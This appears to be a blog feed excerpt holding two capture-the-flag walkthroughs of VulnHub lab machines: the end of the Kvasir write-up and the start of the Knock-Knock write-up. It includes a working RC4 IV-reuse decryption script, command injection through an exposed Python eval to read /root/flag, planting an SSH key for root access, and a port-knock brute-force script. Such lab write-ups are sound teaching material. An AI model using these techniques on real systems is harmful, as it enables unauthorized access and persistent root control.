&lt;p&gt;My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&amp;rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the &lt;code&gt;2&lt;/code&gt; in &lt;code&gt;wep2&lt;/code&gt; was another troll :)&lt;/p&gt;

&lt;h3 id=&#34;attacking-the-encryption-game&#34;&gt;attacking the encryption game&lt;/h3&gt;

&lt;p&gt;Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.&lt;/p&gt;

&lt;p&gt;I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).&lt;/p&gt;

&lt;p&gt;Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.&lt;/p&gt;

&lt;p&gt;I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&amp;rsquo;s cipher text:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./un_wep-testing.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary with &#39;A&#39; *24
[+] iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &#39;B&#39; *24
[+] Frame matched IV of 929d87 in 4559 tries!
[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48

[+] A ^ B
BBBBBBBBBBBBBBBBBBBBBBBB
[+] Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.&lt;/p&gt;

&lt;p&gt;With the changes in, I ended up with the following script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/usr/bin/python

# Kvasir RC4 Key Re-use Attack

import socket

# start a fresh iv_dict used for lookups
iv_dict = {}

# connection to the thing
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&#39;127.0.0.1&#39;, 1234))

# read the banner so we can continue

# =============================
# Can you retrieve my secret..?
# =============================
#
# Usage:
# &#39;V&#39; to view the encrypted flag
# &#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)
banner = sock.recv(1024)

# create some iv:cyper combinations of the flag
print &#39;[+] Generating base iv:cy dictionary&#39;
for i in range(0,5000):
    sock.send(&#39;V\n&#39;)
    frame = sock.recv(150)
    iv = frame.split(&#39;:&#39;)[0]
    cy = frame.split(&#39;:&#39;)[1]

    # add the values
    iv_dict[iv] = cy.strip()
print &#39;[+] The iv_dict knows about %d combinations&#39; % len(iv_dict)

# start processing the second string, looking up the IV
print &#39;[+] Starting Bruteforce with \&#39;B\&#39; *24&#39;
count = 0
while True:

    count += 1
    sock.send(&#39;E &#39; + &#39;B&#39; *24 + &#39;\n&#39;)
    frame = sock.recv(150)
    iv = frame.split(&#39;:&#39;)[0]
    cy = frame.split(&#39;:&#39;)[1].strip() # annoying \n

    if iv in iv_dict:
        print &#39;[+] Frame matched IV of %s in %d tries!&#39; % (iv, count)
        print &#39;[+] Base Cyper Text was: %s&#39; % iv_dict[iv]
        print &#39;[+] Matched Cypher Text: %s&#39; % cy

        # first XOR to get the keystream for this IV
        keystream = &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode(&amp;quot;hex&amp;quot;),&#39;B&#39;*24))
        print &#39;[+] Keystream: %s&#39; % keystream.encode(&amp;quot;hex&amp;quot;)

        # then decode second cypher text using the keystream for the cleartext
        decrypted = &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode(&amp;quot;hex&amp;quot;),keystream))
        print &#39;[+] Decrytped flag is: %s&#39; % decrypted
        break

    # progress incase things take longer than expected
    if count % 100000 == 0:
        print &#39;[+] Tries: %d&#39; % count

print &#39;[+] Done&#39;
sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In no time at all, the above code outputs the decrypted flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./un_wep.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary
[+] The iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &#39;B&#39; *24
[+] Frame matched IV of 06f39e in 1696 tries!
[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
[+] Decrytped flag is: 0W6U6vwG4W1V
[+] Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;0W6U6vwG4W1V&lt;/code&gt;. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&amp;hellip; bed time for me!!&lt;/p&gt;

&lt;h2 id=&#34;finally-getting-the-flag-sort-of&#34;&gt;finally getting the flag, sort of&amp;hellip;&lt;/h2&gt;

&lt;p&gt;I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.&lt;/p&gt;

&lt;p&gt;After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (http://proxychains.sf.net)
127.0.0.1: inverse host lookup failed:
(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
=============================
Can you retrieve my secret..?
=============================

Usage:
&#39;V&#39; to view the encrypted flag
&#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)

0W6U6vwG4W1V
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wut. Ok, so I have a &lt;em&gt;thing&lt;/em&gt; now. It didn’t accept anything I was typing into it. Everything just came back with another &lt;code&gt;&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; ls
&amp;gt; id
&amp;gt; whoami
&amp;gt; ls -lah
&amp;gt; uname -a
&amp;gt; help
&amp;gt; ?
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I disconnected from the netcat session and tabbed back to the session where the &lt;code&gt;/opt/wep2.py&lt;/code&gt; script is started. Immediately it became clear what was going on:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kefka@adm:~$ sudo /opt/wep2.py
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;ls&#39; is not defined
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;whoami&#39; is not defined
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;ls&#39; is not defined
Traceback (most recent call last):
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
NameError: name &#39;uname&#39; is not defined
  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1
    ?
    ^
SyntaxError: invalid syntax
Traceback (most recent call last):
  File &amp;quot;/opt/wep2.py&amp;quot;, line 94, in &amp;lt;module&amp;gt;
    handler(sock, addr)
  File &amp;quot;/opt/wep2.py&amp;quot;, line 74, in handler
    sock.send(p1)
socket.error: [Errno 32] Broken pipe
kefka@adm:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;0W6U6vwG4W1V
&amp;gt; import os; os.system(&#39;id&#39;);
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay :) I went straight for the &lt;code&gt;cat /root/flag&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; import os; os.system(&#39;cat /root/flag&#39;);
    _  __                             _
   | |/ /   __ __   __ _     ___     (_)      _ _
   | &#39; &amp;lt;    \ I /  / _` |   (_-&amp;lt;     | |     | &#39;_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_
  _|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|
  &amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;

Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
gur Zrnq bs Cbrgel...

Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.

Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.

  enfgn_zbhfr(@_EnfgnZbhfr)
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Err, oh &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&amp;rsquo;d in as root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
ProxyChains-3.1 (http://proxychains.sf.net)
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 16:57:16 2014 from localhost
root@adm:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-final-troll&#34;&gt;the final troll&lt;/h2&gt;

&lt;p&gt;With the &lt;code&gt;/root/flag&lt;/code&gt; in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with &lt;code&gt;decode()&lt;/code&gt; again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@adm:~# python
Python 2.7.3 (default, Mar 13 2014, 11:03:55)
[GCC 4.7.2] on linux2
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; with open(&#39;/root/flag&#39;) as f:
...     flag = f.read()
...
&amp;gt;&amp;gt;&amp;gt; print flag.decode(&#39;rot13&#39;)
    _  __                             _
   | |/ /   __ __   __ _     ___     (_)      _ _
   | &#39; &amp;lt;    \ V /  / _` |   (_-&amp;lt;     | |     | &#39;_|
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_
  _|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|
  &amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;

Congratulations on beating Kvasir - I hope you enjoyed
the ride.  Take his blood, mix with honey and drink
the Mead of Poetry...

Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.

Feel free to ping me with thoughts/comments on
http://wi-fu.co.uk, #VulnHub IRC or Twitter.

  rasta_mouse(@_RastaMouse)

&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Wow. I actually can&amp;rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!&lt;/p&gt;

&lt;p&gt;Many many thanks to &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; for putting together this polished piece of work and &lt;a href=&#34;https://twitter.com/VulHub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>knock-knock who’s there? solving knock knock</title>
      <link>https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/</link>
      <pubDate>Tue, 14 Oct 2014 09:14:26 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://vulnhub.com/series/knock-knock,53/&#34;&gt;Knock-Knock&lt;/a&gt; is a vulnerable boot2root VM by &lt;a href=&#34;https://twitter.com/zer0w1re&#34;&gt;@zer0w1re&lt;/a&gt; and sure as heck was packed with interesting twists and things to learn!&lt;/p&gt;

&lt;p&gt;I figured I&amp;rsquo;d just &lt;em&gt;have a quick look™&lt;/em&gt;, and midnight that evening ended up with &lt;em&gt;root&lt;/em&gt; privileges :D&lt;/p&gt;

&lt;p&gt;As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &amp;lsquo;knocking&amp;rsquo; on the door.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;“Theodore!”&lt;/p&gt;

&lt;p&gt;“Theodore who?”&lt;/p&gt;

&lt;p&gt;“Theodore wasn&amp;rsquo;t open so I knocked”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;As always, the vm&amp;rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched &lt;code&gt;arp&lt;/code&gt; for any new entries. This presented the first hurdle. A ping scan showed no new IP&amp;rsquo;s in the network range my VM&amp;rsquo;s were in (192.168.56.0/24):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo nmap -sN 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-14 09:51 SAST
Nmap scan report for 192.168.56.1
Host is up (0.000030s latency).
All 1000 scanned ports on 192.168.56.1 are closed (936) or open|filtered (64)

Nmap done: 256 IP addresses (1 host up) scanned in 14.99 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only the gateway was alive. A &lt;code&gt;arp -a&lt;/code&gt; however spilled some of the beans:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ arp -i vboxnet0 -a
? (192.168.56.0) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
? (192.168.56.2) at (incomplete) on vboxnet0 ifscope [ethernet]

[... snip ...]

? (192.168.56.201) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.202) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.203) at 8:0:27:be:dd:c8 on vboxnet0 ifscope [ethernet]
? (192.168.56.204) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.205) at (incomplete) on vboxnet0 ifscope [ethernet]

[... snip ...]

? (192.168.56.255) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hello &lt;code&gt;.203&lt;/code&gt;! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ping -c 2 192.168.56.203
PING 192.168.56.203 (192.168.56.203) 56(84) bytes of data.
From 192.168.56.203 icmp_seq=1 Destination Port Unreachable
From 192.168.56.203 icmp_seq=2 Destination Port Unreachable

--- 192.168.56.203 ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 999ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal &lt;code&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -sV --reason 192.168.56.203 -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 10:03 SAST
Nmap scan report for 192.168.56.203
Host is up, received reset (0.0016s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT     STATE SERVICE REASON  VERSION
1337/tcp open  waste?  syn-ack

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port1337-TCP:V=6.46%I=7%D=10/14%Time=543CEE50%P=i686-pc-linux-gnu%r(NUL
SF:L,15,&amp;quot;\[12247,\x202759,\x2026802\]\n&amp;quot;)%r(GenericLines,15,&amp;quot;\[37866,\x202
SF:9242,\x203904\]\n&amp;quot;)%r(GetRequest,15,&amp;quot;\[29185,\x207368,\x2028937\]\n&amp;quot;)%r
SF:(HTTPOptions,15,&amp;quot;\[55772,\x205315,\x2050180\]\n&amp;quot;)%r(RTSPRequest,13,&amp;quot;\[9
SF:301,\x2026341,\x20574\]\n&amp;quot;)%r(RPCCheck,16,&amp;quot;\[34002,\x2046353,\x2023995\
SF:]\n&amp;quot;)%r(DNSVersionBindReq,16,&amp;quot;\[47043,\x2037532,\x2024012\]\n&amp;quot;)%r(DNSSt
SF:atusRequest,15,&amp;quot;\[31914,\x208919,\x2027965\]\n&amp;quot;)%r(Help,15,&amp;quot;\[63865,\x2
SF:07077,\x2055801\]\n&amp;quot;)%r(SSLSessionReq,15,&amp;quot;\[30406,\x208520,\x2047713\]\
SF:n&amp;quot;)%r(Kerberos,16,&amp;quot;\[10459,\x2050977,\x2063996\]\n&amp;quot;)%r(SMBProgNeg,16,&amp;quot;\
SF:[61080,\x2038407,\x2048416\]\n&amp;quot;)%r(X11Probe,15,&amp;quot;\[61127,\x2058212,\x203
SF:856\]\n&amp;quot;)%r(FourOhFourRequest,16,&amp;quot;\[11007,\x2051452,\x2038765\]\n&amp;quot;)%r(L
SF:PDString,15,&amp;quot;\[5738,\x2063719,\x2026394\]\n&amp;quot;)%r(LDAPBindReq,14,&amp;quot;\[14292
SF:,\x20937,\x2020668\]\n&amp;quot;)%r(SIPOptions,16,&amp;quot;\[33684,\x2058491,\x2031373\]
SF:\n&amp;quot;)%r(LANDesk-RC,16,&amp;quot;\[58946,\x2030941,\x2053345\]\n&amp;quot;)%r(TerminalServe
SF:r,15,&amp;quot;\[6672,\x2031370,\x2053882\]\n&amp;quot;)%r(NCP,16,&amp;quot;\[15356,\x2041972,\x20
SF:52087\]\n&amp;quot;)%r(NotesRPC,16,&amp;quot;\[51444,\x2044303,\x2013901\]\n&amp;quot;)%r(WMSReque
SF:st,13,&amp;quot;\[87,\x2044952,\x2060309\]\n&amp;quot;)%r(oracle-tns,15,&amp;quot;\[51073,\x204686
SF:0,\x206777\]\n&amp;quot;)%r(afp,16,&amp;quot;\[30287,\x2064026,\x2029364\]\n&amp;quot;)%r(kumo-ser
SF:ver,14,&amp;quot;\[17824,\x2048485,\x20579\]\n&amp;quot;);

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;knock-knock&#34;&gt;knock knock&amp;hellip;&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;tcp/1337&lt;/code&gt; was the only open port on the machine. I promptly connected to it to see what we have:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[6605, 29872, 38566]

root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[43059, 22435, 17432]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/Port_knocking&#34;&gt;Port knocking&lt;/a&gt; generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &amp;lsquo;knocked&amp;rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&amp;rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.&lt;/p&gt;

&lt;p&gt;There are plenty of implementations of port knocking out there. My personal favorite being &lt;a href=&#34;http://www.thoughtcrime.org/software/knockknock/&#34;&gt;knock-knock&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/moxie&#34;&gt;@moxie&lt;/a&gt;. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. &lt;a href=&#34;http://www.thoughtcrime.org/software/knockknock/&#34;&gt;knock-knock&lt;/a&gt; tails the &lt;code&gt;kern.log&lt;/code&gt; and reacts on the correct sequences.&lt;/p&gt;

&lt;p&gt;This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.&lt;/p&gt;

&lt;h2 id=&#34;whos-there&#34;&gt;&amp;hellip;whos there?&lt;/h2&gt;

&lt;p&gt;So with the &lt;code&gt;tcp/1337&lt;/code&gt; service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using &lt;code&gt;nmap&lt;/code&gt; to scan them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
43059/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
22435/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
17432/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With that done, I rescanned the box for any new open ports but nothing was different. I retried the &lt;code&gt;nmap&lt;/code&gt; loop just to make sure, but it did not appear to make a difference.&lt;/p&gt;

&lt;p&gt;Remembering that the sequence changed every time you connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across &lt;a href=&#34;https://github.com/jvinet/knock&#34;&gt;knockd&lt;/a&gt;. I downloaded the &lt;a href=&#34;https://github.com/jvinet/knock/blob/master/src/knock.c&#34;&gt;client&lt;/a&gt; and compiled locally with &lt;code&gt;gcc knock.c -o knock&lt;/code&gt; and tested to see if this makes any difference.&lt;/p&gt;

&lt;p&gt;Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.&lt;/p&gt;

&lt;h2 id=&#34;22-and-80-too&#34;&gt;22 and 80 too&lt;/h2&gt;

&lt;p&gt;The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the &lt;code&gt;tcp/1337&lt;/code&gt; service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ip=IP(dst=&amp;quot;192.168.56.203&amp;quot;)
&amp;gt;&amp;gt;&amp;gt; SYN=TCP(dport=40508,flags=&amp;quot;S&amp;quot;)
&amp;gt;&amp;gt;&amp;gt; send(ip/SYN)
.
Sent 1 packets.
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After quite some time, suddenly, nmap reports &lt;code&gt;tcp/22&lt;/code&gt; and &lt;code&gt;tcp/80&lt;/code&gt; as open&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.203

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:40 SAST
Nmap scan report for 192.168.56.203
Host is up (0.00032s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;W.T.F.&lt;/strong&gt; I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.&lt;/p&gt;

&lt;p&gt;With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

import socket
import itertools
import sys

destination = &amp;quot;192.168.56.203&amp;quot;

def clean_up_ports(raw_string):
    &amp;quot;&amp;quot;&amp;quot; Clean up the raw string received on the socket&amp;quot;&amp;quot;&amp;quot;
    if len(raw_string) &amp;lt;= 0:
        return None

    # Remove the first [
    raw_string = raw_string.replace(&#39;[&#39;,&#39;&#39;)
    # Remove the second ]
    raw_string = raw_string.replace(&#39;]&#39;,&#39;&#39;)
    # split by commas
    first_list = raw_string.split(&#39;,&#39;)

    # start e empty return list
    ports = []
    for port in first_list:
        # strip the whitespace around the string
        # and cast to a integer
        ports.append(int(port.strip()))

    return  ports

def main():
    print &amp;quot;[+] Getting sequence&amp;quot;

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((destination, 1337))
    except Exception as e:
        print &amp;quot;[+] Unable to connect to %s on port 1337. %s&amp;quot; % (destination, e)
        sys.exit(1)

    # receive the list
    raw_list = sock.recv(20)

    # get the ports in a actual python list
    ports = clean_up_ports(raw_list)

    print &amp;quot;[+] Sequence is %s&amp;quot; % ports
    print &amp;quot;[+] Knocking on the door using all the possible combinations...\n&amp;quot;

    # Lets knock all of the possible combinations of the ports list
    for port_list in itertools.permutations(ports):

        print &amp;quot;[+] Knocking with sequence: %s&amp;quot; % (port_list,)
        for port in port_list:
            print &amp;quot;[+] Knocking on port %s:%s&amp;quot; % (destination,port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((destination, port))
            sock.close()

        print &amp;quot;[+] Finished sequence knock\n&amp;quot;

if __name__ == &#39;__main__&#39;:
    print &amp;quot;[+] Knock knock opener&amp;quot;
    main()
    print &amp;quot;[+] Done&amp;quot;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this opened the ports every go :)&lt;/p&gt;

